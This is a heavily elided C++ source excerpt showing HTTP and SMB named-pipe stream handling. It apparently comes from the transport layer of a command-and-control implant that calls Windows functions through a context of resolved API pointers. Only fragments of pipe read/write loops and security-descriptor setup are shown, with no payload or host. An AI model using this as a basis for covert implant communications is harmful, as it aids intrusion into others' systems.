...
namespace Http {
    ...
    VOID HttpCallback(PSTREAM Outbound, PSTREAM *Inbound) {
        ...
        do {
            ...
            x_memcpy(SCAST(PBYTE, Download) + Total, Buffer, Read);
        ...
        (*Inbound) = SCAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
...
namespace Smb {
    ...
    VOID SmbContextInit(PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
        ...
        access.Trustee.ptstrName = SCAST(LPSTR, SmbSecAttr->Sid);
        ...
        if (!(SmbSecAttr->pAcl = SCAST(PACL, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH)))) {
    ...
    BOOL PipeRead(PSTREAM Inbound, HANDLE Handle) {
        ...
        do {
            if (!Ctx->win32.ReadFile(Handle, SCAST(PBYTE, Inbound->Buffer) + Total, MIN((Inbound->Length - Total), PIPE_BUFFER_MAX), &Read, nullptr)) {
    ...
    BOOL PipeWrite(PSTREAM Outbound, HANDLE Handle) {
        ...
        do {
            if (!Ctx->win32.WriteFile(Handle, SCAST(PBYTE, Outbound->Buffer) + Total, MIN((Outbound->Length - Total), PIPE_BUFFER_MAX), &Write, nullptr)) {
                return FALSE;
            }
